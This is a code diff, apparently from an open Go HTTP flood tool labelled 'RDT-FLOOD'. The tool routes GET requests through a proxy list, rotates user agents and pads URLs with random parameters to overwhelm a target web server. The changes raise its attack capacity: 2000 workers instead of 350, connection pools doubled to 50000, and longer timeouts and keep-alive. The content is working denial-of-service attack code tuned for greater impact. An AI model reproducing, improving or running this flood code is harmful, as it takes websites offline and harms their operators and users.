@@ -23,11 +23,11 @@ import (
 
 
 const (
-	wrk          = 350 
-	to           = 3 * time.Second 
-	sub          = 5
+	wrk          = 2000 
+	to           = 6 * time.Second 
+	sub          = 5 
 	RPS_CONTROL  = 300 
-	KEEP_ALIVE   = 30 * time.Second
+	KEEP_ALIVE   = 60 * time.Second
 )
 
 var UA = []string{
@@ -237,12 +237,12 @@ func main() {
 	for i, PROXYLINK := range proxies {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
-				Timeout:   3 * time.Second,
+				Timeout:   5 * time.Second,
 				KeepAlive: KEEP_ALIVE,
 			}).DialContext,
 			DisableKeepAlives:      false,
-			MaxIdleConns:           25000,
-			MaxIdleConnsPerHost:    25000,
+			MaxIdleConns:           50000,
+			MaxIdleConnsPerHost:    50000,
 			MaxConnsPerHost:        0,
 			IdleConnTimeout:        KEEP_ALIVE,
 			TLSClientConfig: &tls.Config{
@@ -261,8 +261,8 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   3 * time.Second,
-			ResponseHeaderTimeout: 2 * time.Second,
+			TLSHandshakeTimeout:   5 * time.Second,
+			ResponseHeaderTimeout: 3 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
 		}
 		ip := ""
@@ -278,6 +278,7 @@ func main() {
 		}
 		wcs[i] = CLI{client: client, ip: ip}
 	}
+
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
@@ -330,7 +331,7 @@ func main() {
 							reqURL += "&big=" + strings.Repeat("x", 1024+rand.Intn(1024))
 						}
 						if rand.Intn(10) == 0 {
-							reqURL += "&" + RST(8) + "=" + RST(12)
+							reqURL += "&" + randomString(8) + "=" + randomString(12)
 						}
 
 						req, _ := http.NewRequest("GET", reqURL, nil)
@@ -430,7 +431,7 @@ func main() {
 	wg.Wait()
 }
 
-func RST(length int) string {
+func randomString(length int) string {
 	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
 	for i := range b {
